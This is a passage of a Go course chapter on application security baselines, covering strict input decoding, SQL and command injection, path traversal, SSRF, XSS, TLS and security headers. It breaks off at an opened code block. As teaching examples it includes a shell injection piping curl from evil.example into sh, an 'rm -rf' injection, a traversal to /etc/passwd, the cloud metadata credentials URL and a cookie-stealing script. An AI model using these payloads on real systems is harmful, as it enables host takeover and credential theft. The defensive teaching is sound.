@@ -1,0 +1,1284 @@
+---
+title: "Application Security Baseline"
+part: 2
+order: 14
+type: "course"
+description: "Hostile input by default; the injection family (SQL, command, path traversal); SSRF; XSS and html/template auto-escaping; TLS and security headers; secrets out of logs; and supply-chain scanning with govulncheck."
+prerequisites: ["background-jobs-scheduling"]
+---
+
+<HeroCard label="Part 2 · Chapter 14" title="Application Security Baseline">
+
+Listen closely, sport, because I'm only going to say this once — and frankly, I resent having to say it at all, because any engineer worth the salary already lives by it.
+
+Every byte that arrives over the network is a weapon aimed at your service. The database chapter gave you parameterized queries. The servers chapter gave you strict decoders. The config chapter told you not to log secrets. This chapter welds all of that into a single, coherent doctrine: **the secure-coding hygiene your service needs before it touches production, no matter what it does.**
+
+Part 3 will layer the fintech-specific controls on top. But you can't build a vault on a foundation that cracks. Let's harden the foundation.
+
+</HeroCard>
+
+<ChapterTabs tabs={["Input is Hostile", "The Injection Family", "SSRF", "XSS and html/template", "Transport and Headers", "Secrets out of Logs", "Supply-Chain Scanning"]} />
+
+<Scene
+  title="Malicious input at Meridian's validation boundary"
+  actors={[
+    { id: "atk", label: "Attacker" },
+    { id: "val", label: "Meridian Validation" },
+    { id: "db",  label: "DB" },
+  ]}
+  cells={[
+    { id: "A1", label: "payload" },
+    { id: "A2", label: "handler" },
+    { id: "A3", label: "query" },
+  ]}
+  rows={1}
+  cols={3}
+  frames={[
+    {
+      caption: "Attacker fires a SQL-injection payload: promo_code = \"' OR '1'='1\".",
+      beat: "neutral",
+      actors: [{ id: "atk", state: "active" }, { id: "val", state: "idle" }, { id: "db", state: "idle" }],
+      cells: [{ id: "A1", state: "bad", label: "SQL payload" }, { id: "A2", state: "idle", label: "handler" }, { id: "A3", state: "idle", label: "query" }],
+    },
+    {
+      caption: "Naive handler: fmt.Sprintf builds the query. The payload crosses the boundary as raw SQL.",
+      beat: "problem",
+      actors: [{ id: "atk", state: "active" }, { id: "val", state: "bad" }, { id: "db", state: "warn" }],
+      cells: [{ id: "A1", state: "bad", label: "SQL payload" }, { id: "A2", state: "bad", label: "no validation" }, { id: "A3", state: "bad", label: "injected SQL" }],
+    },
+    {
+      caption: "DB executes the injected query — every promo code returned. Attacker wins.",
+      beat: "problem",
+      actors: [{ id: "atk", state: "ok" }, { id: "val", state: "bad" }, { id: "db", state: "bad" }],
+      cells: [{ id: "A1", state: "bad", label: "SQL payload" }, { id: "A2", state: "bad", label: "bypassed" }, { id: "A3", state: "bad", label: "DB compromised" }],
+    },
+    {
+      caption: "With input validation + a parameterized query: the payload is rejected at the boundary. The DB never sees it.",
+      beat: "solution",
+      actors: [{ id: "atk", state: "idle" }, { id: "val", state: "ok" }, { id: "db", state: "done" }],
+      cells: [{ id: "A1", state: "bad", label: "SQL payload" }, { id: "A2", state: "ok", label: "rejected" }, { id: "A3", state: "done", label: "safe param" }],
+    },
+  ]}
+  caption="The root cause of every injection attack: untrusted input treated as code. Validation + parameterized queries close the gap."
+/>
+
+## Input is Hostile
+
+Here's the scenario. Your ledger API's `/checkout` handler accepts a JSON body with a `promo_code`, an `amount`, and an `items` array. A customer fires a perfectly shaped request. Then a researcher fires one with `"amount": -99999`, a 10-megabyte `items` array, and seventeen unknown fields you never defined. Your handler receives both requests — it can't tell them apart by address alone.
+
+**Every external input is hostile by default.** Not maybe-hostile. Not hostile-until-proven-innocent. Hostile. Period.
+
+### The two rules: allow-lists and strict decoding
+
+<Define term="Input validation (allow-list)" since="Application Security Baseline (Part 2)">
+**Input validation** is the act of inspecting every external value against a specification of what is *acceptable* before it touches any business logic or database. An **allow-list** defines the exact set of permitted values — correct format, range, length — and rejects everything else. Its opposite, a deny-list, blocks only known-bad values and is always incomplete: attackers find variants you haven't listed. Allow-list validation at the entry point is the first line of defence for Meridian's payment API.
+</Define>
+
+**Allow-lists beat deny-lists every time.** A deny-list says "reject these known-bad values." An allow-list says "accept only these known-good values." Deny-lists rot — an attacker finds a variant you didn't block. Allow-lists hold — you only pass what you explicitly permit.
+
+**Decode into strict shapes.** Go's `encoding/json` package is lenient by default: unknown fields are silently ignored, and there's no limit on body size. You must opt into strictness. Both of these were introduced back in the HTTP servers chapter; here they're security controls, not just hygiene:
+
+```go
+// LedgerCheckout decodes a checkout request from an HTTP handler.
+// This is the strict-decode pattern — every external JSON body should
+// use it. Never use json.Unmarshal on a raw, unbounded reader.
+func LedgerCheckout(w http.ResponseWriter, r *http.Request) {
+	// 1. Cap the body so a 10 MB bomb can't hold a goroutine hostage.
+	r.Body = http.MaxBytesReader(w, r.Body, 1<<20) // 1 MB ceiling
+
+	dec := json.NewDecoder(r.Body)
+	dec.DisallowUnknownFields() // unknown fields → decode error, not silent drop
+
+	var req CheckoutRequest
+	if err := dec.Decode(&req); err != nil {
+		http.Error(w, "bad request: "+err.Error(), http.StatusBadRequest)
+		return
+	}
+	if err := validateCheckout(req); err != nil {
+		http.Error(w, "invalid: "+err.Error(), http.StatusUnprocessableEntity)
+		return
+	}
+	// proceed with a validated, bounded request
+}
+```
+
+`http.MaxBytesReader` wraps the body so reading beyond the limit returns an error instead of allocating unbounded memory. `DisallowUnknownFields` turns silent field-drops into loud decode errors — you see your API contract being violated rather than silently absorbing whatever junk a client sends.
+
+### Validate at the boundary, not deep inside
+
+The rule is: **validate and normalize inputs as close to the entry point as possible, then pass only clean values deeper.** A `validateCheckout` function that runs *before* any database or business logic is the sentinel at the gate:
+
+```go
+// validateCheckout enforces the allow-list rules for a checkout request.
+// All business logic downstream can trust that these invariants hold.
+func validateCheckout(req CheckoutRequest) error {
+	if req.AmountCents <= 0 {
+		return fmt.Errorf("amount must be positive")
+	}
+	if req.AmountCents > 1_000_000_00 { // $1,000,000 ceiling (cents)
+		return fmt.Errorf("amount exceeds limit")
+	}
+	if len(req.Items) == 0 || len(req.Items) > 200 {
+		return fmt.Errorf("items must be 1–200")
+	}
+	// Allow-list: promo codes are uppercase letters and digits, 4–12 chars.
+	if req.PromoCode != "" {
+		if !promoCodeRE.MatchString(req.PromoCode) {
+			return fmt.Errorf("invalid promo code format")
+		}
+	}
+	return nil
+}
+
+var promoCodeRE = regexp.MustCompile(`^[A-Z0-9]{4,12}$`)
+```
+
+The regex is an allow-list: it specifies the *exact* shape a promo code can take, not a list of shapes to reject. Everything that doesn't match is rejected.
+
+<ExecTimeline
+  title="Malicious checkout request rejected at the validation boundary"
+  lanes={[{ id: "req", label: "handler" }]}
+  steps={[
+    { lane: "req", kind: "recv", label: "POST /checkout", note: "Request arrives from the network with an oversized body and negative amount." },
+    { lane: "req", kind: "run", label: "MaxBytesReader applied", note: "Body is wrapped so reading past 1 MB returns an error immediately." },
+    { lane: "req", kind: "run", label: "dec.DisallowUnknownFields()", note: "Unknown fields in the JSON payload will produce a decode error rather than being dropped silently." },
+    { lane: "req", kind: "run", label: "dec.Decode(&req)", note: "The decoder parses the bounded body into the strict CheckoutRequest shape." },
+    { lane: "req", kind: "block", label: "validateCheckout fails", note: "amount=-99999 fails the positive check. The validator returns an error before any database or business logic is touched." },
+    { lane: "req", kind: "done", label: "400 Bad Request returned", note: "The malicious input never reaches the ledger. The response is sent; the goroutine is free." }
+  ]}
+  caption="Validation at the entry point: the exploit is stopped before it reaches any sensitive code path."
+/>
+
+<Callout kind="pro" title="Normalize before you validate">
+
+**Normalization** (trimming whitespace, lowercasing, canonicalizing unicode) comes *before* validation. A `" SAVE10 "` promo code with leading/trailing spaces is either a valid `"SAVE10"` after trimming or a bug in the caller — decide which, then enforce it consistently. An attacker who can slip a value past validation by encoding it differently has won. Canonicalize first, then apply your allow-list.
+
+</Callout>
+
+<QuickCheck
+  question="Why is an allow-list (permit known-good) stronger than a deny-list (block known-bad)?"
+  options={[
+    "Allow-lists are faster to evaluate at runtime",
+    "Deny-lists can always be bypassed by a variant the list doesn't include; allow-lists only pass what you explicitly permitted",
+    "Allow-lists work in Go; deny-lists only work in interpreted languages",
+    "They are equivalent — one is just an inverted version of the other"
+  ]}
+  answer={1}
+  explain="Deny-lists rot over time as attackers discover variants not in the list. An allow-list only passes inputs that match a known-good specification, so a variant the attacker crafted is rejected by default, not by a rule you haven't written yet."
+/>
+
+## The Injection Family
+
+Three classic injection attacks. They share one root cause: **untrusted input is treated as code or a path rather than as data.** Go's standard tooling closes each one cleanly — but only if you reach for the right tool.
+
+### SQL injection
+
+<Define term="SQL injection" since="SQL & Databases in Go (Part 1)">
+**SQL injection** happens when user-supplied text is concatenated directly into a SQL query string. The database can't tell where the query ends and the data begins, so an attacker encodes SQL syntax inside their input — ending a string literal, adding a `OR 1=1`, calling `DROP TABLE` — and the database executes it as a real query. At Meridian, a single injected promo code could return every discount in the table, or silently delete the ledger. The fix is always a **parameterized query**: the query template and the values travel as separate wire messages; the driver ensures values are never interpreted as SQL.
+</Define>
+
+SQL injection happens when user-supplied text lands inside a query string and the database interprets it as SQL syntax. The canonical example is a `promo_code` field:
+
+<BeforeAfter
+  badLabel="SQL injection"
+  goodLabel="Parameterized"
+  bad={`// VULNERABLE: fmt.Sprintf builds the query.
+// Input "' OR '1'='1" breaks the quote
+// boundary and returns every promo code.
+q := fmt.Sprintf(
+  "SELECT discount FROM promos WHERE code='%s'",
+  req.PromoCode,
+)
+rows, _ := db.QueryContext(ctx, q)`}
+  good={`// SAFE: the placeholder ? (or $1 in pgx)
+// is filled by the driver as a typed value.
+// The promo code is data, never SQL.
+rows, err := db.QueryContext(ctx,
+  "SELECT discount FROM promos WHERE code=$1",
+  req.PromoCode,
+)`}
+/>
+
+The parameterized form sends the query string and the argument to the database as **separate wire messages**. The database never concatenates them. The user's input is always a typed value in a column comparison — it physically cannot become SQL syntax. This was covered in depth in the databases chapter; here it's restated as a security control: **every query that touches external input must be parameterized, no exceptions.**
+
+The attack-surface check: `grep -r 'Sprintf.*SELECT\|Sprintf.*INSERT\|Sprintf.*UPDATE\|Sprintf.*DELETE' .` in your repository. Any match is a critical finding.
+
+### Command injection
+
+<Define term="Command injection">
+**Command injection** happens when user-supplied input is passed to a shell interpreter as part of a command string. The shell tokenizes the string, so characters like `;`, `&&`, `$()`, or a backtick become statement separators — a second command the attacker wrote, running with your service's privileges. If Meridian's receipt-conversion job passes a user filename to `/bin/sh -c "convert " + filename`, an attacker can append `; curl evil.example/backdoor | sh` and own the host.
+</Define>
+
+`os/exec` lets Go run external programs. The footgun is `exec.Command("/bin/sh", "-c", userInput)` — passing user input to a shell interpreter as a single string. The shell tokenizes it, which means a `;`, `&&`, `$()`, or backtick in the input becomes a second command:
+
+<BeforeAfter
+  badLabel="Shell injection"
+  goodLabel="Args, not shell"
+  bad={`// VULNERABLE: user controls the whole
+// shell string. Input "foo; rm -rf /data"
+// runs two commands.
+cmd := exec.Command(
+  "/bin/sh", "-c",
+  "convert "+userFilename,
+)`}
+  good={`// SAFE: the binary and each argument
+// are separate strings. The OS passes them
+// directly — no shell tokenization.
+cmd := exec.Command(
+  "/usr/bin/convert",
+  "--", // end of flags
+  sanitizedFilename,
+)`}
+/>
+
+The fix: **never pass a shell interpreter a string containing user input.** Pass the binary path and each argument as a separate string to `exec.Command`. The OS hands them directly to `execve` without any shell in the middle. Add `"--"` as an argument-terminator before any user-supplied filename to prevent it from being parsed as a flag.
+
+<GoPlayground>
+
+```go
+package main
+
+import (
+	"fmt"
+	"os/exec"
+)
+
+// safeConvert demonstrates the correct exec.Command pattern:
+// binary and arguments are separate — no shell, no injection.
+func safeConvert(inputFile, outputFile string) error {
+	// os/exec.Command never spawns a shell when given separate args.
+	// Each argument is a distinct string passed directly to the OS.
+	cmd := exec.Command("echo", "would convert:", "--", inputFile, "->", outputFile)
+	out, err := cmd.CombinedOutput()
+	if err != nil {
+		return fmt.Errorf("convert: %w", err)
+	}
+	fmt.Printf("output: %s", out)
+	return nil
+}
+
+func main() {
+	// Even a malicious filename is just a filename — not a command.
+	malicious := "invoice.pdf; echo INJECTED"
+	if err := safeConvert(malicious, "out.png"); err != nil {
+		fmt.Println("error:", err)
+	}
+}
+```
+
+</GoPlayground>
+
+### Path traversal
+
+<Define term="Path traversal">
+**Path traversal** (also called directory traversal) is an attack where an attacker supplies `../` sequences in a filename or URL path to escape an intended directory. If Meridian's receipt API joins `/data/receipts/` with a user-supplied filename directly, the input `../../etc/passwd` resolves outside the receipts directory — potentially exposing system files or secrets. The fix is `filepath.Clean` to collapse all `..` segments, followed by a `strings.HasPrefix` containment check to confirm the resolved path is still inside the permitted root.
+</Define>
+
+A path traversal attack uses `../` sequences to escape an intended directory. If your ledger API serves uploaded receipts from `/data/receipts/` and the filename comes from the user, the input `../../etc/passwd` resolves to a path well outside receipts.
+
+<BeforeAfter
+  badLabel="Traversal"
+  goodLabel="Containment check"
+  bad={`// VULNERABLE: user input goes straight
+// into a filepath.Join. ../.. escapes
+// the receipts directory.
+func serveReceipt(w http.ResponseWriter,
+  r *http.Request) {
+  name := r.URL.Query().Get("file")
+  path := filepath.Join(
+    "/data/receipts", name)
+  http.ServeFile(w, r, path)
+}`}
+  good={`// SAFE: Clean resolves all .. segments,
+// then we confirm the result stays
+// inside the root before serving.
+func serveReceipt(w http.ResponseWriter,
+  r *http.Request) {
+  name := r.URL.Query().Get("file")
+  root := "/data/receipts"
+  clean := filepath.Clean(
+    filepath.Join(root, name))
+  if !strings.HasPrefix(clean, root+"/") {
+    http.Error(w, "forbidden", 403)
+    return
+  }
+  http.ServeFile(w, r, clean)
+}`}
+/>
+
+`filepath.Clean` resolves all `.`, `..`, and redundant separators to a canonical path. After cleaning, a `strings.HasPrefix` check against the expected root catches any attempt that escaped. Note the trailing `/` in the prefix: without it, a root of `/data/receipts` would also permit `/data/receipts-other/`.
+
+<GoPlayground>
+
+```go
+package main
+
+import (
+	"fmt"
+	"path/filepath"
+	"strings"
+)
+
+// safeReceiptPath returns (cleanPath, true) if the filename stays
+// inside the receipts root, or ("", false) if it escapes.
+func safeReceiptPath(root, name string) (string, bool) {
+	clean := filepath.Clean(filepath.Join(root, name))
+	// Require the trailing slash so "root-sibling" is not permitted.
+	if !strings.HasPrefix(clean, root+string(filepath.Separator)) {
+		return "", false
+	}
+	return clean, true
+}
+
+func main() {
+	root := "/data/receipts"
+	cases := []string{
+		"invoice-2024.pdf",           // safe
+		"../../etc/passwd",           // traversal attempt
+		"../receipts-other/bill.pdf", // escape to sibling dir
+		"subdir/scan.png",            // safe subdirectory
+	}
+	for _, c := range cases {
+		path, ok := safeReceiptPath(root, c)
+		if ok {
+			fmt.Printf("ALLOWED: %s\n", path)
+		} else {
+			fmt.Printf("BLOCKED: %q\n", c)
+		}
+	}
+}
+```
+
+</GoPlayground>
+
+<UnderTheHood title="Why filepath.Clean is not optional">
+
+`filepath.Clean` is a pure path algebra function — it applies a fixed set of reduction rules:
+
+1. Replace multiple slashes with one.
+2. Eliminate `.` (current dir) elements.
+3. Eliminate each inner `..` and the non-`..` element before it.
+4. Eliminate `..` elements that start a rooted path.
+
+Step 3 is the critical one. `filepath.Join("/data/receipts", "../../etc/passwd")` without `Clean` would produce `/data/receipts/../../etc/passwd`. With `Clean`, it produces `/etc/passwd`. You then see immediately that the cleaned path does not start with `/data/receipts/` and you return 403. Without the containment check, you'd serve `/etc/passwd`. The Join+Clean+HasPrefix pattern is the idiom; none of the three steps is optional.
+
+As of Go 1.24, `filepath.Clean` handles platform-specific separators correctly on Windows (backslash) and Unix (slash). If your service runs on Windows, use `filepath.ToSlash` to normalize before the prefix check so you aren't surprised by mixed separators.
+
+</UnderTheHood>
+
+<QuickCheck
+  question={'Why does the path traversal containment check use strings.HasPrefix(clean, root+"/") with a trailing slash, not just root?'}
+  options={[
+    "A trailing slash makes the comparison faster",
+    "Without the trailing slash, a root like /data/receipts would also permit /data/receipts-other/ since that string also starts with /data/receipts",
+    "filepath.Clean always appends a trailing slash",
+    "It is a style convention with no security significance"
+  ]}
+  answer={1}
+  explain="Without the trailing slash, a HasPrefix check against /data/receipts would also match /data/receipts-other/, allowing traversal into a sibling directory. Appending the separator enforces that the clean path is inside the directory, not merely a sibling that shares a prefix."
+/>
+
+## SSRF
+
+<Define term="SSRF (Server-Side Request Forgery)">
+**SSRF** is an attack where an attacker tricks your service into making an outbound HTTP request to a URL they control — typically an internal endpoint your service can reach but the attacker cannot. Your service has access to internal services behind a firewall, cloud metadata endpoints (`169.254.169.254` on AWS returns IAM credentials to any EC2 process), and private VPCs. They all trust requests coming from your IP. If the attacker steers your service, they inherit that trust. At Meridian, a merchant who can set a webhook URL can point it at the instance metadata service and walk out with production credentials.
+</Define>
+
+**Server-side request forgery (SSRF)** is what happens when your service makes an outbound HTTP request to a URL that the *user* controls. Your ledger API might let merchants configure a webhook URL to receive payment notifications. Sounds fine. Now an attacker sets that URL to `http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-role` — the AWS instance metadata endpoint that hands back IAM credentials to any process running on the EC2 instance.
+
+The threat model: **your service has access to resources that the attacker doesn't.** Internal services behind a firewall, cloud metadata endpoints, databases on private VPCs — they trust requests coming from your service's IP. If the attacker can steer your service, they inherit that trust.
+
+### Why the naive HTTP client is dangerous here
+
+```go
+// VULNERABLE: the merchant controls webhookURL.
+// Nothing stops them pointing it at 169.254.169.254.
+resp, err := http.Get(webhookURL)
+```
+
+The default `http.Client` will happily follow that URL, and the instance metadata service will respond with credentials.
+
+### Locking out internal endpoints
+
+The defense is a custom `http.Client` with a dialing hook that validates the resolved IP before opening the connection:
+
+```go
+// safeDialer returns a net.Dialer that rejects requests to
+// link-local, loopback, and private (RFC 1918) addresses.
+// Wire this into an http.Transport for all outbound webhook calls.
+func safeDialer() *net.Dialer {
+	return &net.Dialer{
+		Control: func(network, address, c syscall.RawConn) error {
+			// address is "host:port" after DNS resolution
+			host, _, err := net.SplitHostPort(address)
+			if err != nil {
+				return fmt.Errorf("invalid address: %w", err)
+			}
+			ip := net.ParseIP(host)
+			if ip == nil {
+				return fmt.Errorf("unresolvable host")
+			}
+			if isBlockedIP(ip) {
+				return fmt.Errorf("destination address is not permitted")
+			}
+			return nil
+		},
+	}
+}
+
+func isBlockedIP(ip net.IP) bool {
+	blocked := []string{
+		"127.0.0.0/8",    // loopback
+		"10.0.0.0/8",     // RFC 1918
+		"172.16.0.0/12",  // RFC 1918
+		"192.168.0.0/16", // RFC 1918
+		"169.254.0.0/16", // link-local (cloud metadata)
+		"::1/128",        // IPv6 loopback
+		"fc00::/7",       // IPv6 unique local
+		"fe80::/10",      // IPv6 link-local
+	}
+	for _, cidr := range blocked {
+		_, net, _ := net.ParseCIDR(cidr)
+		if net.Contains(ip) {
+			return true
+		}
+	}
+	return false
+}
+```
+
+The `Control` callback fires after DNS resolution and before the TCP connection is opened. By that point we know the final IP — there's no TOCTOU window between the check and the dial. If DNS resolves a "safe" hostname to `169.254.169.254` (DNS rebinding), we still catch it because the control fires on the *resolved* IP.
+
+<Callout kind="warn" title="Allow-list outbound destinations where possible">
+
+If your service only ever needs to call Stripe, your own internal service mesh, or a small set of known partners, **allow-list the destinations** rather than blocklisting everything private. An allow-list of `["api.stripe.com", "hooks.yourco.internal"]` is far stronger than a blocklist of RFC 1918 ranges — the attacker can't bypass it by finding a public IP that proxies to a private one.
+
+</Callout>
+
+<ExecTimeline
+  title="SSRF: blocked at the dial layer"
+  lanes={[{ id: "srv", label: "your service" }, { id: "dial", label: "safeDialer" }]}
+  steps={[
+    { lane: "srv", kind: "run", label: "recv webhook URL from merchant", note: "Merchant sets webhook to http://169.254.169.254/latest/meta-data/..." },
+    { lane: "srv", kind: "send", label: "http.Client.Do(req)", note: "Your service makes the outbound request via the custom transport." },
+    { lane: "dial", kind: "run", label: "DNS resolves hostname", note: "The dialer resolves the IP address of the destination." },
+    { lane: "dial", kind: "block", label: "isBlockedIP: 169.254.x.x", note: "The Control callback fires. 169.254.0.0/16 is link-local — blocked." },
+    { lane: "dial", kind: "done", label: "connection refused", note: "The dial returns an error before any TCP packet is sent." },
+    { lane: "srv", kind: "done", label: "error returned to caller", note: "The outbound call fails. No credentials were leaked." }
+  ]}
+  caption="The SSRF block fires after DNS resolution but before the TCP handshake — catching DNS rebinding as well as direct IP attacks."
+/>
+
+## XSS and html/template
+
+<Define term="XSS (Cross-Site Scripting) and html/template auto-escaping" since="HTTP Servers: JSON, Streaming & WebSockets (Part 1)">
+**XSS** is an attack where an attacker injects JavaScript into a page your server renders, which then executes in a victim's browser — stealing session cookies, exfiltrating tokens, or hijacking the page entirely. The vector: user-controlled text lands in HTML output without being escaped. Go's `html/template` package is the defense: it is a context-aware compiler that tracks whether each `{{"{{.Field}}"}}` action is in an HTML body, an attribute, a `href`, or a `<script>` block, and applies the correct escaping automatically. Unlike `text/template`, which outputs strings verbatim, `html/template` makes XSS opt-in rather than opt-out — you have to deliberately use `template.HTML` to bypass it.
+</Define>
+
+Cross-site scripting (XSS) is a class of attack where an attacker injects JavaScript into a page your server renders, and that JavaScript executes in a victim's browser — stealing session cookies, exfiltrating tokens, or hijacking the page. The vector: user-controlled text lands in HTML output without being escaped.
+
+Your ledger service has an admin dashboard that renders transaction descriptions server-side. A merchant sets their business name to `<script>fetch('https://evil.example/steal?c='+document.cookie)</script>`. If your template inserts that string raw into the HTML, every admin who views the page runs that script.
+
+### The rule: `html/template`, never `text/template`
+
+Go ships two template packages:
+
+- **`text/template`** — generic text generation. It outputs strings as-is. If you put user data through it into an HTML context, you have an XSS vulnerability.
+- **`html/template`** — HTML-aware. It tracks the context (HTML body, attribute value, `<script>` tag, URL attribute) and **escapes the data appropriately for that context automatically.** This is the one you use for server-rendered HTML. Every time.
+
+<BeforeAfter
+  badLabel="text/template — XSS"
+  goodLabel="html/template — safe"
+  bad={`import "text/template"
+
+// VULNERABLE: text/template outputs
+// the description verbatim.
+// <script>...</script> executes.
+const tmpl = \`<td>{{.Desc}}</td>\`
+t := template.Must(
+  template.New("row").Parse(tmpl))
+t.Execute(w, data)`}
+  good={`import "html/template"
+
+// SAFE: html/template escapes < > " '
+// in HTML context. The script tag
+// becomes inert text, not code.
+const tmpl = \`<td>{{.Desc}}</td>\`
+t := template.Must(
+  template.New("row").Parse(tmpl))
+t.Execute(w, data)`}
+/>
+
+The import path is the *only* change. The template syntax is identical. But `html/template` is a context-aware compiler, not a string interpolator.
+
+<GoPlayground>
+
+```go
+package main
+
+import (
+	"html/template"
+	"os"
+)
+
+// txRow is a single row in the admin transactions table.
+type txRow struct {
+	ID   string
+	Desc string
+}
+
+func main() {
+	// The attacker controls the Desc field.
+	row := txRow{
+		ID:   "tx_001",
+		Desc: `<script>fetch('https://evil.example/steal?c='+document.cookie)</script>`,
+	}
+
+	// html/template escapes the payload so it prints as inert text in the browser.
+	const tmpl = `<tr><td>{{.ID}}</td><td>{{.Desc}}</td></tr>`
+	t := template.Must(template.New("row").Parse(tmpl))
+
+	// Output to stdout so you can see the escaping in action.
+	// In a real handler, w would be the http.ResponseWriter.
+	if err := t.Execute(os.Stdout, row); err != nil {
+		panic(err)
+	}
+}
+```
+
+</GoPlayground>
+
+Run it. The `<script>` tag is rendered as `&lt;script&gt;...&lt;/script&gt;` — angle brackets become HTML entities. The browser displays the text. It does not execute the JavaScript.
+
+### How context-tracking works (and how `template.HTML` defeats it)
+
+`html/template` parses the template at compile time (`template.Must`/`Parse`) into a **context-aware tree**. Each action (`{{.Desc}}`) knows its context: is it inside an HTML tag body? An attribute value? A `<script>` block? A `href` attribute? The escaper picks the correct escaping function for each context.
+
+The footgun: **`template.HTML` is an explicit bypass.**
+
+```go
+// template.HTML marks a string as "already-safe HTML" — the template
+// engine will NOT escape it. This is only safe if you generated the
+// HTML yourself and it contains no user input.
+safe := template.HTML("<strong>Hello</strong>")
+```
+
+The instant you do `template.HTML(userInput)`, you've told the engine the user's string is pre-approved HTML and it re-introduces the XSS vulnerability. Never do this with external input. The only legitimate use of `template.HTML` is for HTML you generated in your own code that you know is clean.
+
+<ExecTimeline
+  title="html/template auto-escaping a script payload"
+  lanes={[{ id: "tmpl", label: "html/template" }]}
+  steps={[
+    { lane: "tmpl", kind: "run", label: "Parse template", note: "template.Must parses the template string and builds a context-aware AST. Each action node is tagged with its HTML context." },
+    { lane: "tmpl", kind: "run", label: "Execute: reach {{.Desc}}", note: "The engine evaluates .Desc and gets the raw string containing <script>..." },
+    { lane: "tmpl", kind: "run", label: "Context: HTML body", note: "The action is inside a <td> — the context is plain HTML body. The engine selects HTMLEscapeString." },
+    { lane: "tmpl", kind: "run", label: "Escape: < → &lt; > → &gt;", note: "All angle brackets, quotes, and ampersands are replaced with HTML entities." },
+    { lane: "tmpl", kind: "done", label: "Inert text written to response", note: "The browser receives &lt;script&gt;...&lt;/script&gt; — text, not code. No JavaScript executes." }
+  ]}
+  caption="html/template escapes at the point of injection, in the correct context, automatically."
+/>
+
+<UnderTheHood title="How html/template tracks context">
+
+`html/template` is a **static analyzer** wrapped around `text/template`. When you call `Parse`, it walks the template's parse tree and annotates every `{{.Foo}}` action with an `escapeState` — a value from the `context` type that encodes where in the HTML document the action lives.
+
+The state machine has roughly a dozen states: `stateText` (HTML body), `stateAttr` (an attribute value), `stateURL` (a `href` or `src`), `stateJS` (inside a `<script>` block), `stateCSS` (inside a `<style>`), `stateAttrName`, and a few more. Transitions are driven by the static HTML tokens surrounding each action.
+
+At execution time, the runtime calls the escaper for the annotated state:
+
+- `stateText` → `html.EscapeString` (entities)
+- `stateAttr` → attribute-value escaping (entities + extra quote protection)
+- `stateURL` → `urlFilter` first (blocks `javascript:` and `data:` schemes), then `_html_template_urlnormalizer`
+- `stateJS` → JSON-encodes the value so it can only be a JS literal, never a statement
+- `stateCSS` → CSS hex-encoding
+
+This is why `html/template` protects not only HTML body injection but also DOM-based XSS through attribute injection and script injection. The context-tracker handles cases `text/template` never sees. As of Go 1.24, the state machine lives in `html/template/context.go` and `escape.go`.
+
+</UnderTheHood>
+
+<QuickCheck
+  question={'What does template.HTML("userInput") do in html/template?'}
+  options={[
+    "It escapes the string extra-thoroughly before inserting it",
+    "It marks the string as already-safe, bypassing all escaping — if userInput contains a <script> tag, it will execute",
+    "It is a compile-time error to use template.HTML with a variable",
+    "It strips all HTML tags from the string before inserting it"
+  ]}
+  answer={1}
+  explain="template.HTML is an explicit trust declaration. The engine treats the value as pre-approved HTML and inserts it verbatim. If userInput came from an external source and contains a <script> payload, it will execute in the browser. Only use template.HTML for HTML you generated yourself."
+/>
+
+## Transport and Headers
+
+A hardened application layer means nothing if the transport is insecure or the browser doesn't know your content policy. Two controls: TLS enforcement and security headers.
+
+### Enforce TLS
+
+Your service should never serve plain HTTP in production. If you're behind a reverse proxy (nginx, Caddy, a cloud load balancer), the proxy terminates TLS and forwards `X-Forwarded-Proto: https` — you should check that header and redirect if it's missing:
+
+```go
+// RequireHTTPS is middleware that redirects plain HTTP to HTTPS.
+// Use behind a TLS-terminating proxy that sets X-Forwarded-Proto.
+func RequireHTTPS(next http.Handler) http.Handler {
+	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		if r.Header.Get("X-Forwarded-Proto") == "http" {
+			target := "https://" + r.Host + r.URL.RequestURI()
+			http.Redirect(w, r, target, http.StatusMovedPermanently)
+			return
+		}
+		next.ServeHTTP(w, r)
+	})
+}
+```
+
+If Go's `net/http` server is terminating TLS directly (not behind a proxy), use `http.ListenAndServeTLS` and supply a valid certificate. `crypto/tls` in Go 1.24 defaults to TLS 1.2 minimum with a safe cipher suite list — you should not override `MinVersion` downward.
+
+### The security headers every handler should send
+
+Five headers. They're cheap to add, and each closes a class of browser-side attack:
+
+```go
+// SecurityHeaders is middleware that sets the standard security headers.
+// Wire it into your router's global middleware chain, before your handlers.
+func SecurityHeaders(next http.Handler) http.Handler {
+	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		h := w.Header()
+
+		// Tell the browser to only visit over HTTPS for the next 2 years,
+		// and include subdomains. No HTTP fallback ever.
+		h.Set("Strict-Transport-Security", "max-age=63072000; includeSubDomains")
+
+		// Restrict where content can load from. This is a strong CSP for
+		// an API-only service. For server-rendered HTML, tune the policy.
+		h.Set("Content-Security-Policy", "default-src 'self'")
+
+		// Block MIME-type sniffing. The browser must respect Content-Type.
+		h.Set("X-Content-Type-Options", "nosniff")
+
+		// Deny framing by default (clickjacking protection).
+		h.Set("X-Frame-Options", "DENY")
+
+		// Restrict Referer header to same origin.
+		h.Set("Referrer-Policy", "strict-origin-when-cross-origin")
+
+		next.ServeHTTP(w, r)
+	})
+}
+```
+
+<ConceptGrid cols={3}>
+  <ConceptCard label="Strict-Transport-Security">HSTS. Tells the browser to always use HTTPS for this domain for the specified `max-age` (seconds). Once set, the browser never makes a plain HTTP request — not even on first visit if the HSTS preload list includes your domain.</ConceptCard>
+  <ConceptCard label="Content-Security-Policy">Declares which origins may load scripts, styles, images, and other resources. `default-src 'self'` blocks all third-party content — essential for preventing injected scripts from loading external payloads.</ConceptCard>
+  <ConceptCard label="X-Content-Type-Options">Prevents the browser from MIME-sniffing a response away from the declared `Content-Type`. Without it, a file upload returned with `Content-Type: text/plain` might be executed as HTML by some browsers if it looks like HTML.</ConceptCard>
+  <ConceptCard label="X-Frame-Options">Prevents the page from being embedded in an iframe on another origin — the mechanism behind clickjacking attacks where an attacker overlays a transparent iframe over a button the victim clicks.</ConceptCard>
+  <ConceptCard label="Referrer-Policy">Controls how much URL information is sent in the `Referer` header. `strict-origin-when-cross-origin` sends the full URL for same-origin navigations, only the origin for cross-origin HTTPS → HTTPS, and nothing for HTTPS → HTTP.</ConceptCard>
+  <Gotcha>HSTS is a one-way ratchet. Once a browser caches an HSTS policy, it will refuse to load your site over HTTP until the `max-age` expires — even if you want to roll back. Test on a staging domain before setting HSTS on production. Never set `max-age` to a large value on a domain you might lose control of.</Gotcha>
+</ConceptGrid>
+
+<GoPlayground>
+
